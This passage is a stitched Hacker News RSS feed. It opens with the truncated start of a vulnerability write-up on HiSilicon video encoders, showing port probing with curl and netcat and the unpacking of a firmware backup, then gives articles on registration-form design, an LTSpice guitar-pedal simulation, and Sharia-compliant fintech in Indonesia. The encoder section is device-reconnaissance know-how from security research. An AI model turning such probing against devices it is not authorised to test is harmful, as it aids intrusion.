<img src="https://kojenov.com/assets/2020-09-15-encoders/110-login.png" alt="login"></p>

<p>The login prompt suggests basic HTTP authentication, but this is actually <a href="https://en.wikipedia.org/wiki/Digest_access_authentication">digest authentication</a>. The following header is returned by the application:</p>

<div><div><pre><code>WWW-Authenticate: Digest qop="auth", ...
</code></pre></div></div>

<p>and the browser authenticates with:</p>

<div><div><pre><code>Authorization: Digest username="admin", ...
</code></pre></div></div>

<p>(as I will demonstrate below, digest is not the only authentication method supported by the application)</p>

<p>After logging in, the user sees a simple web interface.
<img src="https://kojenov.com/assets/2020-09-15-encoders/120-status.png" alt="status"></p>

<p>Note that vendors customize the interface, and your device can display something completely different, such as:
<img src="https://kojenov.com/assets/2020-09-15-encoders/130-status.png" alt="status">However, the underlying functionality (the web API calls) are all the same regardless of the UI.</p>

<p>There are several sections where the administrator can perform various tasks such as setting up the network, adjusting encoder parameters, uploading images to overlay the video, upgrading the firmware, and so on.</p>

<h3 id="554-8554---rtsp">554, 8554 - RTSP</h3>

<p>RTSP stands for <a href="https://en.wikipedia.org/wiki/Real_Time_Streaming_Protocol">Real Time Streaming Protocol</a>. If it‚Äôs enabled, one can watch the video stream directly from the encoder.</p>

<div><div><pre><code>$ curl -i rtsp://encoder:554
RTSP/1.0 200 OK
CSeq: 1
Server: Server Version 9.0.6
Public: OPTIONS, DESCRIBE, PLAY, SETUP, SET_PARAMETER, GET_PARAMETER, TEARDOWN
</code></pre></div></div>

<h3 id="1935---rtmp">1935 - RTMP</h3>

<p><a href="https://en.wikipedia.org/wiki/Real-Time_Messaging_Protocol">Real Time Messaging Protocol</a>, another way to deliver video</p>

<h3 id="5150---serial-to-tcp">5150 - serial to TCP</h3>

<p>Mysterious service. <code>netcat</code> connects but the server does not seem to react to any input</p>

<div><div><pre><code>$ nc -v encoder 5150
Connection to encoder 5150 port [tcp/*] succeeded!
foo
bar
...
</code></pre></div></div>

<p>This initially puzzled me, but when playing with devices from other vendors I noticed that some firmwares allowed control over this port:
<img src="https://kojenov.com/assets/2020-09-15-encoders/140-serial.png" alt="serial"></p>

<h3 id="9588---another-web-server">9588 - another web server</h3>

<p>This one is <code>nginx</code>, but not exactly clear what it is for.</p>

<div><div><pre><code>$ curl -i http://encoder:9588
HTTP/1.1 200 OK
Server: nginx/1.6.0
Date: Thu, 22 Mar 2018 14:28:13 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Wed, 05 Dec 2018 10:58:31 GMT
Connection: keep-alive
ETag: "5c07af57-264"
Accept-Ranges: bytes

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Welcome to nginx!&lt;/title&gt;
...
</code></pre></div></div>

<h2 id="firmware-analysis">Firmware analysis</h2>

<p>Clicking around the web interface, I noticed the backup feature:
<img src="https://kojenov.com/assets/2020-09-15-encoders/150-backup.png" alt="backup">
I immediately went ahead and backed up (i.e. downloaded) both the firmware and the configuration.</p>

<h3 id="content">Content</h3>

<p>The firmware backup is a RAR archive that can be easily unpacked:</p>

<div><div><pre><code>$ file up.rar
up.rar: RAR archive data, v4, os: Win32

$ mkdir up
$ cd up
$ unrar ../up.rar
...
</code></pre></div></div>

<p>Here is the directory structure:</p>

<div><div><pre><code>$ tree -d
.
‚îú‚îÄ‚îÄ disk
‚îú‚îÄ‚îÄ ko
‚îÇ   ‚îî‚îÄ‚îÄ extdrv
‚îú‚îÄ‚îÄ lib
‚îú‚îÄ‚îÄ nginx
‚îÇ   ‚îú‚îÄ‚îÄ conf
‚îÇ   ‚îú‚îÄ‚îÄ html
‚îÇ   ‚îú‚îÄ‚îÄ logs
‚îÇ   ‚îî‚îÄ‚îÄ sbin
‚îî‚îÄ‚îÄ web
    ‚îú‚îÄ‚îÄ css
    ‚îú‚îÄ‚îÄ images
    ‚îú‚îÄ‚îÄ js
    ‚îî‚îÄ‚îÄ player
        ‚îî‚îÄ‚îÄ icons
</code></pre></div></div>

<ul>
  <li><code>disk</code>: empty</li>
  <li><code>ko</code>: kernel modules (device drivers)</li>
  <li><code>lib</code>: empty</li>
  <li><code>nginx</code>: nginx executables and configuration</li>
  <li><code>web</code>: static content (html, js, css‚Ä¶)</li>
</ul>

<p>The most important things are in the root of the archive:</p>

<div><div><pre><code>$ ls -l
total 12756
-rw------- 1 root root     307 Jul 14 08:31 box.ini
-rw------- 1 root root 6533364 Jul 14 08:31 box.v400_hdmi
drwx------ 2 root root    4096 Jul 14 08:31 disk
-rw------- 1 root root 2972924 Jul 14 08:31 font.ttf
-rw------- 1 root root 1570790 Jul 14 08:31 hostapd
-rw------- 1 root root    1847 Jul 14 08:31 hostapd.conf
drwx------ 3 root root    4096 Jul 14 08:31 ko
drwx------ 2 root root    4096 Jul 14 08:31 lib
drwx------ 6 root root    4096 Jul 14 08:31 nginx
-rw------- 1 root root 1382400 Jul 14 08:31 nosig.yuv
-rw------- 1 root root      38 Jul 14 08:31 passwd
-rw------- 1 root root  211248 Jul 14 08:31 png2bmp
-rw------- 1 root root   19213 Jul 14 08:30 remserial
-rw------- 1 root root    6624 Jul 14 08:30 reset
-rw------- 1 root root     968 Jul 14 08:30 run
-rw------- 1 root root     878 Jul 14 08:30 udhcpc.script
-rw------- 1 root root     191 Jul 14 08:30 udhcpd.conf
drwx------ 6 root root    4096 Jul 14 08:31 web
-rw------- 1 root root   39166 Jul 14 08:31 wpa_cli
-rw------- 1 root root  264069 Jul 14 08:31 wpa_supplicant
</code></pre></div></div>

<p>In addition to some general utilities ( <code>hostapd</code>, <code>png2bmp</code>, <code>remserial</code>, <code>wpa_cli</code>, <code>wpa_supplicant</code>) it contains the custom web application <code>box.v400_hdmi</code> which is a compiled binary:</p>

<div><div><pre><code>$ file box.v400_hdmi 
box.v400_hdmi: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
</code></pre></div></div>

<p><strong>This executable is the primary target of my research, and ‚Ä¶</strong></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/">https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/</a></em></p>]]>
            </description>
            <link>https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516453</guid>
            <pubDate>Fri, 18 Sep 2020 13:26:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Best Practices for Registration Forms]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24516368">thread link</a>) | @mooreds
<br/>
September 18, 2020 | https://fusionauth.io/learn/expert-advice/identity-basics/registration-best-practices | <a href="https://web.archive.org/web/*/https://fusionauth.io/learn/expert-advice/identity-basics/registration-best-practices">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>Signing up for accounts is something we‚Äôre all familiar with. It‚Äôs a gateway to applications we want and need. But it‚Äôs not really fun. Or even pleasant. After all, we‚Äôre signing up to access the application, not because we want to set up another username and password and enter personal data into yet another system:</p>

<p><img src="https://fusionauth.io/assets/img/advice/registration-best-practices/long-registration-form.png" alt="A long registration form. Honestly? You need my full name and my middle name?"></p>

<p>You can make the registration form process simpler. And you should.</p>

<h2 id="is-a-registration-form-needed-at-all">Is a registration form needed at all?</h2>

<p>Before you start, ask yourself a fundamental question: does your application require registration?</p>

<p>While user registration to create an account is commonplace, every step required of a user before seeing the value of your application affects sign up rates. What can you do to avoid a typical registration process?</p>

<h3 id="let-them-try-it-first">Let them try it first</h3>

<p>Potential users are trying to kick the tires on your application. From a 2020 masters thesis, <a href="https://aaltodoc.aalto.fi/bitstream/handle/123456789/44930/master_Meissner_Mai_2020.pdf?sequence=1&amp;isAllowed=y">A User-Centered Approach to Landing Page Optimization in a Software-as-a-Service Business (PDF)</a>:</p>

<blockquote>
  <p>‚ÄúVisitors have several different needs before deciding to sign up and test the service. The most prominent need is understanding what the service offers and whether it could be a suitable solution for their problem.‚Äù</p>
</blockquote>

<p>Is there functionality, degraded or not, which you can offer to visitors? For example, if you are building a drawing application, can you let a user create and download a picture without an account? This degraded functionality will allow a user to see the value of your application with minimal investment.</p>

<p>If you are building a site which displays information based on a search, allow users to see a few results without signing up. While teasers may be frustrating to some, they also reveal the results‚Äô value.</p>

<p>In a <a href="http://cups.cs.cmu.edu/soups/2013/trustbusters2013/Sign_up_or_Give_up_Malheiros.pdf">2013 study (PDF)</a>, Microsoft researches found the source of a sign up impacted conversion:</p>

<blockquote>
  <p>The more valuable services are more likely to be considered worth the privacy and effort cost of disclosing personal data, while the least valuable will not.</p>
</blockquote>

<p>Allowing visitors to use your application, even in a limited fashion, helps them assess if a signup is worth their time.</p>



<p>You can also rely on a third party for account management. Would social login make for a smoother experience? If you are targeting enterprise users, can you integrate with internal identity providers such as ActiveDirectory?</p>

<p>Different types of users will expect different third party auth providers. If you have a consumer focused application, almost everyone has a Facebook account, so offer that social identity provider. One less password for your potential users to remember and one less obstacle to them signing up.</p>

<p>If you are targeting enterprise customers, integrate with ActiveDirectory or similar corporate directory. If developers are your target market, GitHub authentication makes for a simple registration process and signals that you understand their needs.</p>

<h3 id="passwordless">Passwordless</h3>

<p>Passwordless login allows a user to authenticate with something they have (access to a phone or email account) rather than something they know (a password).</p>

<p>While passwordless authentication requires providing some level of contact information, users do not have to create and remember yet another password.</p>

<p>All the above options provide an application with less data than the typical registration process. That‚Äôs the cost. The benefit is less signup friction.</p>

<h2 id="ease-the-pain-of-registration">Ease the pain of registration</h2>

<p>If you‚Äôve decided you need a registration form, remember that it is a form first and foremost. You should follow known best practices.</p>

<h3 id="a-form-is-a-form-is-a-form">A form is a form is a form</h3>

<p>The Nielsen Norman Group discusses improving forms in their 2016 article, <a href="https://www.nngroup.com/articles/web-form-design/">Website Forms Usability: Top 10 Recommendations</a>. The number one suggestion is:</p>

<blockquote>
  <p>‚ÄúKeep it short. ‚Ä¶ Eliminating unnecessary fields requires more time [to decide what data is worth asking for], but the reduced user effort and increased completion rates make it worthwhile. Remove fields which collect information that can be (a) derived in some other way, (b) collected more conveniently at a later date, or (c) simply omitted.‚Äù</p>
</blockquote>

<p>Carefully consider the information you are asking for. The fewer fields the better. While admittedly in a different context, <a href="https://unbounce.com/conversion-rate-optimization/how-to-optimize-contact-forms/">Imagescape more than doubled a contact form conversion rate</a> by decreasing the number of fields from 11 to 4. There may be data needed only for certain features of your application; ask for it when that feature is first accessed, rather than at signup.</p>

<p>Make sure your form is mobile friendly; test at various screen sizes. The tediousness of data entry on a mobile device and the prevalence of their usage are another reason to have as few signup form fields as possible.</p>

<p>If a form field is optional, clearly mark it so. Even better, don‚Äôt ask for optional data on the initial user registration. Request that information later, when the user is more engaged and has discovered the value of your offering.</p>

<p>Provide clear error messages when data fails to validate. Use both client side validation, which is faster, and server side validation, which is tamper proof. On the topic of tampering, ensure any form is submitted over TLS. You want to keep submitted information confidential and secure.</p>

<p>Make use of the full suite of HTML elements. Dropdowns and radio buttons are powerful, but number and email input fields leverage browsers‚Äô built-in validation and should be used as well. If you aren‚Äôt sure what‚Äôs supported, use tools like <a href="https://caniuse.com/">caniuse.com</a> to verify compatibility.</p>

<h3 id="registration-forms-are-unique">Registration forms are unique</h3>

<p>But registration forms aren‚Äôt just another form. They are the gateway to your full application or site.</p>

<p>What causes angst when a user is signing up? This <a href="https://discovery.ucl.ac.uk/id/eprint/1378346/1/ewic_hci12_diss_paper7.pdf">2012 paper (PDF)</a> examined registration for government services. It defined sign up friction as ‚Äúthe imbalance between the business process (user goals) and [required] security behaviour‚Äù around signing up. This study found friction was best explained by the following attributes of a signup process:</p>

<ul>
  <li>The number of new credentials required</li>
  <li>Any delay in the process, such as waiting for an activation email</li>
  <li>Whether registration requires an interruption of a user‚Äôs routine</li>
  <li>The frequency of legally obligated use of the service</li>
</ul>

<p>Obviously you can‚Äôt control the last aspect, but minimize the number of new credentials, delays and interruptions in your registration process.</p>

<p>Most registration forms ask for a username and password. Make it clear what are valid values. If a username is an email address, allow all valid email addresses, including aliases.</p>

<p>Avoid complicated password validation rules. Allow users to use a password manager. NIST recommends a focus on avoiding passwords known to be insecure.</p>

<blockquote>
  <p>‚Äú[A]nalyses of breached password databases reveal that the benefit of [password complexity] rules is not nearly as significant as initially thought, although the impact on usability and memorability is severe.‚Äù - <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf">Appendix A‚ÄîStrength of Memorized Secrets, NIST Special Publication 800-63B</a></p>
</blockquote>

<p>Obtain proper user consent. What this is depends on your plans for the requested information and what regulatory regime applies. Different levels of informed consent may be required. For example, if you are in the USA and are dealing with a child‚Äôs personal information, you‚Äôll want to make sure you get parental consent because of COPPA.</p>

<p>Ensure new users enter sensitive data correctly. If there are any critical fields, such as a government ID, provide a confirmation field asking for the data to be re-entered to ensure the data is typed correctly. This is an exception to the rule of asking for less data. If the stakes of incorrect data entry are high, the additional work is worth the inconvenience.</p>

<p>If you need more than a few pieces of information on registration, consider splitting the sign up form into steps and using a registration stepper, also known as a multi-step form or a wizard. A stepper is a user interface element which shows how many steps are required to complete an action:</p>

<blockquote>
  <p>‚ÄúSteppers display progress through a sequence by breaking it up into multiple logical and numbered steps.‚Äù - <a href="https://material.io/archive/guidelines/components/steppers.html">Google‚Äôs material design reference</a>‚Äù.</p>
</blockquote>

<h2 id="multi-step-registration">Multi-step registration</h2>

<p>Splitting up a registration form allows you to ask for more data, but avoid imposing a high initial cognitive cost on a potential user. It also allows you to track registration progress. Rather than a registration being an all or nothing proposition, you can see where people fall out of the registration funnel: is it because of step two or step three? It also may increase the conversion rate: Instapage saw an <a href="https://instapage.com/blog/multi-step-form-part-2">18% increase in conversion rate</a> when they split their registration form into multiple steps.</p>

<p><img src="https://fusionauth.io/assets/img/advice/registration-best-practices/shorter-reg-form.png" alt="A multi-step registration form."></p>

<p>When creating the pages, group fields logically, as per the Nielsen Norman Group recommendations which suggest grouping ‚Äúrelated labels and fields.‚Äù Separate pages allow you to provide a contextual explanation of how providing the data will be useful to the visitor at each step. If you can‚Äôt come up with a reasonable one, consider removing the fields.</p>

<p>Ask for as little as possible on the first registration step. Once they take that first step, they‚Äôll be more committed to finishing, thanks to our <a href="http://changingminds.org/techniques/general/cialdini/consistency.htm">love of consistency</a>.</p>

<p>Ensure you are clear about the number of steps the registration process will take. Doing so lets the user assess the effort involved.</p>

<h3 id="maintaining-state">Maintaining state</h3>

<p>Splitting a form up into multiple steps requires maintaining state across submissions. If you are using a framework, investigate helper libraries, such as <a href="https://github.com/zombocom/wicked">wicked</a> for Ruby on Rails or <a href="https://github.com/ycs77/laravel-wizard">lavavel-wizard</a> for Laravel.</p>

<p>If you are rolling your own solution, you can maintain state in hidden form parameters or in the user‚Äôs session. Either way, you‚Äôll want to serialize entered and validated data and store it. Then, when the form is ready to submit, you can deserialize this value and process the entire form, typically saving it to a datastore.</p>

<p>Another option is to save registration data in the datastore and progressively add to the user‚Äôs profile as they work through the steps. This ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fusionauth.io/learn/expert-advice/identity-basics/registration-best-practices">https://fusionauth.io/learn/expert-advice/identity-basics/registration-best-practices</a></em></p>]]>
            </description>
            <link>https://fusionauth.io/learn/expert-advice/identity-basics/registration-best-practices</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516368</guid>
            <pubDate>Fri, 18 Sep 2020 13:18:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simulating the ProCo Rat Distortion Pedal in LTSpice]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24516227">thread link</a>) | @cushychicken
<br/>
September 18, 2020 | http://cushychicken.github.io/ltspice-proco-rat/ | <a href="https://web.archive.org/web/*/http://cushychicken.github.io/ltspice-proco-rat/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It‚Äôs been a long time since I‚Äôve done <a href="http://cushychicken.github.io/posts/ltspice-tube-screamer/">a pedal simulation</a>, and, well, quarantine times are as good a time as any to fill time with LTSpice simulation. Since Radiohead is a too-appropirate soundtrack for the time in which we live, and Thom Yorke is a famous user, why not simulate the ProCO RAT distortion pedal?</p><p>If you‚Äôd like to follow along at home, I‚Äôve put <a href="https://github.com/Cushychicken/ltspice-guitar-pedals/tree/master/proco-rat-distortion">the LTSpice file on GitHub</a>. Find any errors? Got any neat mods you‚Äôd like to include? Please, submit a pull request!</p><p>You may need to rustle up a diode model for the 1N914 to run - it is not one of the models included in the LTSpice install.</p><p>Here‚Äôs the whole schematic, labeled for clarity:</p><p><img src="http://cushychicken.github.io/assets/images/proco_rat_whole_schematic" alt="Whole Schematic"></p><p>The interesting stuff is largely concentrated in the clipping, tone, and output stages.</p><p>The clipping stage is formed by a LM308 opamp in a noninverting configuration. R2 biases the input at 4.5[V] for maximum dynamic range in the opamp output - i.e., halfway between the 9V rail and GND. Feedback gain is set by potentiometer R9. When shorted to 0[ohm], it reduces the clipping stage to a simple opamp follower (gain=1). When set to a maximum, gain of the amp in signal bands is: \(Gain = 1 + \frac{Rgain}{(560 || 47)} = ~2300 [V/V] = ~67[dB]\) This is more than enough gain to drive to the opamp rail for even a gentle input signal. Fed raw into a guitar amplifier, this signal would completely saturate the input. That‚Äôs where the D2/D3 diode clipping pair come in to play. (Note, though, that the input saturation is desirable to some users. A common modification to this pedal is to remove D2/D3, and rely solely on opamp clipping. This yields a volume boost, and crunchier tone.)</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433482578.png" alt="Clipping Stage"></p><p>The AC coupling network of C10/R10 works to shift the signal back to a DC balanced square wave. D2/D3 serve to clip the signal down to a more modest +/-0.65[V].</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433524694.png" alt="Input vs Opamp Output vs Clipping Diodes"></p><p>This is slightly more interesting when you move into the frequency domain, however. The net effect, as the gain increases, is to emphasize the 1kHz band of the guitar - ideally, to cut through the mix of a band. (A rock band, that is - not a frequency band.)</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433598206.png" alt="Image"></p><p>Note that all of these traces converge to the same rolloff asymptote. That‚Äôs the limitation imposed by the LM308‚Äôs output slew rate. At higher gain, the opamp can‚Äôt switch any faster, which limits the response of higher frequencies as the gain increases.</p><p>The tone control is remarkably simple - just a first order RC filter, with potentiometer R17 to allow the user to set the rolloff frequency.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433644991.png" alt="Tone RC Filter"></p><p>R15 and C11 set a limit of the RC filter of the tone stage at about 32kHz. Increasing pot R17 moves that corner frequency lower and lower, until bottoming out at 475Hz. This filter effectively smooths the square wave into progressively softer edges. As R17 increases, the transitions get less square, and closer to a triangular wave.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433664315.png" alt="Image"></p><p>This is my estimate of who lies where on the tone curve, based on a subset of <a href="https://en.wikipedia.org/wiki/Pro_Co_RAT#Notable_users">Wikipedia‚Äôs list of RAT users</a>:</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433692230.png" alt="Clipping vs Users"></p><p>The output driver is also relatively simple - just a JFET follower, with a simple RC filter serving as a highpass filter for volume control. As R14 decreases in resistance, so does the output volume.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433718430.png" alt="Image"></p><ul><li>Increasing the compensation capacitor of the LM308 opamp (C1 in our schematic) has some interesting properties. Increasing this to 300pF creates a softer transition to the opamp railing out, which yields an overall softer clip - fewer higher harmonics. An alternative design, for a less harsh clip.</li><li>Increasing the compensation cap higher proves problematic - or interesting, depending on your viewpoint. Increasing C1 to 3nF yields a gentle oscillation in the opamp output. This could make for some wacky mixed frequency effects. Might be a fun thing to wire up and see what happens.</li><li>Different diodes for D2/D3 could also change the clipping profile, and the harshness of the clip.</li></ul><p><a href="https://www.electrosmash.com/proco-rat">ElectroSmash</a>, of course, is the vanguard of guitar pedal EE knowhow. I used their page of schematics and simulation output as a sanity check that I got all of this right.</p><p>You can see the slew rate limitation of the LM308 in <a href="https://www.analog.com/media/en/technical-documentation/data-sheets/lt0108.pdf">the datasheet</a>. Gain/bandwidth product is on page 4, under ‚ÄúOpen Loop Frequency Response‚Äù.</p></div></div>]]>
            </description>
            <link>http://cushychicken.github.io/ltspice-proco-rat/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516227</guid>
            <pubDate>Fri, 18 Sep 2020 13:06:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital banking, now halal]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 82 (<a href="https://news.ycombinator.com/item?id=24516141">thread link</a>) | @jbegley
<br/>
September 18, 2020 | https://restofworld.org/2020/now-serving-halal-apps/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/now-serving-halal-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>T</span>he average fintech startup founder faces a taxing to-do list: raise seed funding, scope out a user base, recruit talent, build something people will actually use. For the Indonesian entrepreneur, the Muslim-majority market presents an additional hurdle: build an app that is compliant with Islamic religious law, or Sharia.</p>



<p>New fintech startups must present themselves before the Indonesian Ulema Council (Majelis Ulama Indonesia, or MUI, in Bahasa Indonesian), composed of religious clerics from across the archipelago, for Sharia certification, in order to reach Indonesia‚Äôs 220 million Muslim users, who generally seek out products that fit their faith.&nbsp;</p>



<p>MUI shapes much of Indonesian life. The body has <a href="https://www.vice.com/en_in/article/bjpwwm/indonesia-just-got-its-first-halal-fridge-heres-a-list-of-everything-else-that-needs-a-stamp">conducted halal audits on household products</a>, verifying that milk, moisturizer, and instant ramen meet strict religious criteria. Its <em>fatwa</em> commission also regularly intervenes in the moral life of Indonesians, promulgating headline-making rulings on <a href="https://www.rappler.com/world/regions/asia-pacific/indonesia/87440-bhimanto-suwastoyo-fatwa-homosexuality-indonesia-death-penalty">homosexuality</a> and <a href="https://academic.oup.com/jis/article-abstract/18/2/202/726927">secularism</a>. Since the late 1990s, when Indonesian politics began a turn toward Islamic conservatism, the council‚Äôs influence has grown, according to Syafiq Hasyim, a Jakarta-based scholar of MUI and the political economy.&nbsp;</p>



	




<p>Now MUI is using its policing power to shape a new sector of Indonesian society: consumer technology. In November 2019, Vice President Ma‚Äôruf Amin declared the <a href="https://www.scmp.com/week-asia/economics/article/3044601/how-sharia-economy-shapes-democracy-indonesia">‚ÄúShariatization‚Äù of the economy</a> ‚Äî i.e., the growth of digital financial services catering to Muslim users ‚Äî a priority for the country‚Äôs development. Indonesian Muslim consumers currently spend $224 billion annually. When fintech companies build platforms for these users ‚Äî whether peer-to-peer lending apps, mobile money services, or online stock-trading portals ‚Äî MUI acts as the arbiter of their religious legitimacy. MUI‚Äôs National Sharia Council (Dewan Syariah Nasional, or DSN) issues certificates that verify platforms are compliant with Sharia. The chairman of DSN just happens to be the vice president himself.</p>



<p>To earn a certificate, new startups must adhere to the council‚Äôs combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech. New fatwas are added every year on digital finance topics that now include commodities trading online and cryptocurrencies. In the certification process, MUI‚Äôs religious scholars become embedded in the early evolution of a company‚Äôs digital products, their background not in software engineering or UX design but the traditions and teachings of Islam.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-40x85.jpeg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-541x1066.jpeg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-400x850.jpeg 400w, " sizes="(max-width: 640px) 100vw, 300px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>In Sharia, for example, <a href="https://www.investopedia.com/terms/r/riba.asp#:~:text=Riba%20is%20prohibited%20under%20Shari,and%20helping%20others%20through%20kindness.">charging interest, or <em>riba</em></a><em>,</em> is strictly prohibited. Sharia promotes charitable financial dealings and labels interest and guaranteed profits inherently unjust. Instead of a conventional credit model, Sharia lending platforms operate according to <a href="https://www.sciencedirect.com/science/article/pii/S187705091931230X"><em>mudarabah</em></a>. Under this model, rather than a lender extracting a profit from a borrower, the borrower and lender enter a more equitable contract. For a small-business loan, for example, the lender receives a predetermined share of profits but must also share in the losses, since the borrower has invested labor and knowledge in the business. This model underpins a host of peer-to-peer lending apps targeting Muslim users in Indonesia.</p>



<p>For Sharia stock trading, MUI mandates, under <a href="https://drive.google.com/file/d/0BxTl-lNihFyzZUxIbkR3RXV4TWc/view">Fatwa No. 80</a>, that traders invest only in halal companies. Online stock trading platforms like MNC Trade Syariah vet all potential listings accordingly, removing any that deal in gambling, alcohol, or pork products.</p>



<p>For some companies, compliance is more of a challenge. Take LinkAja. <a href="https://kr-asia.com/linkaja-ceo-danu-wicaksana-ready-to-be-the-biggest-mobile-payment-platform-in-indonesia">Launched in June 2019</a> and currently serving 45 million registered users, it‚Äôs one of the country‚Äôs largest mobile money services <a href="https://www.thejakartapost.com/adv-longform/2019/12/27/why-gojek-users-leave-their-cash-behind-and-turn-to-gopay.html">behind leaders like GoJek‚Äôs digital wallet</a> GoPay and OVO. Customers can send, store, or receive electronic money on the LinkAja app. </p>



<p>Late last year, the company announced it was building the first Sharia mobile money product in Indonesia, a digital wallet for Muslim consumers to be called LinkAja Sharia Services. Standard LinkAja app users would be able to go into their settings and switch to a parallel platform built for Sharia compliance. But before they even created a prototype, LinkAja‚Äôs team knew they needed to consult MUI.</p>



<p>Most Islamic fintech companies have an appointed head of Sharia, a taskmaster who manages the compliance process. At LinkAja, that person is Widjayanto Djaenudin. While he had no experience in Sharia technology per se, he spent more than a decade at Telkomsel, Indonesia‚Äôs largest telecoms operator, developing mobile products for the unbanked. His task at LinkAja was to liaise with MUI and guide the company through its certification process, a challenge, considering the tenuous status of Sharia scholarship on mobile money apps. </p>



<p>Some clerics have argued that <a href="http://www.ikim.gov.my/new-wp/index.php/2019/08/22/some-sharia-considerations-concerning-e-wallet/">digital wallets are a form of <em>haram</em></a>, a term for practices forbidden by Islamic law<em>. </em>The<em> </em>digital-only cash-back rebates and other discounts with partner retailers commonly found on these apps are considered, by some clerics, a form of interest payment between businesses ‚Äî riba in disguise. MUI has ruled sending and storing money in digital wallets acceptable, but only under strict terms.&nbsp;</p>



<figure><blockquote><p>To earn a certificate, new startups must adhere to the council‚Äôs combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech.</p></blockquote></figure>



<p>After conducting a rigorous product-proposal review, MUI appointed a three-member supervisory board to Djaenudin‚Äôs team well-versed in the nuances of its rulings. The board included Anwar Abbas, chairman of an Islamic reformist organization in Southern Java‚Äôs Yogyakarta and author of a national bestseller promoting the vice president‚Äôs ‚ÄúShariatization‚Äù worldview, <a href="https://www.tokopedia.com/dojobuku/ma-ruf-amin-way-sahala-panggabean-by-anwar-abbas"><em>The Ma‚Äôruf Amin Way</em></a><em>. </em>‚ÄúThey are all Sharia experts,‚Äù said Djaenudin. ‚ÄúThey gave us guidance and consultations about the product.‚Äù </p>



<p>Starting in November 2019, shortly after the vice president‚Äôs Shariatization initiative, Djaenudin was required to brief these scholars on market research, product testing, and the ins and outs of engineering every month. MUI‚Äôs supervisory board would share their insights and ensure the technological infrastructure of the app followed MUI‚Äôs rulings.&nbsp;</p>



<p>An MUI fatwa issued in 2017 was of particular concern to Djaenudin. <a href="https://drive.google.com/file/d/1KPAvhhziJ61Pt8EFxxTFfDPNmRHJoQDG/view">Fatwa No. 116</a> begins with verses from the Quran published in both classical Arabic script and Bahasa Indonesian. ‚ÄúO you who have believed, when you contract a debt for a specified term, write it down. And let a scribe write it between you in justice,‚Äù reads one verse. They are followed closely by <a href="https://yaqeeninstitute.org/emadhamdeh/are-hadith-necessary/">quotations from books of <em>hadith</em></a>, records of the sayings of the Prophet Muhammad: ‚ÄúDo not sell gold for gold, and do not sell silver for silver, except in case of like for like.‚Äù</p>



<p>These threads of theological precedent are woven together to create a set of rulings reinterpreting classical verse for the new digital economy. According to the fatwa, these Quranic lines have a specific implication for fintech: floating funds must be housed in certified Islamic banks. Contracts between all parties ‚Äî users, banking institutions, or the app itself ‚Äî must be grounded in Sharia contract law. Any promotional campaign cannot include riba.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-40x23.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-400x232.png 400w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-600x348.png 600w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-1000x580.png 1000w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-1600x928.png 1600w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-2800x1623.png 2800w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


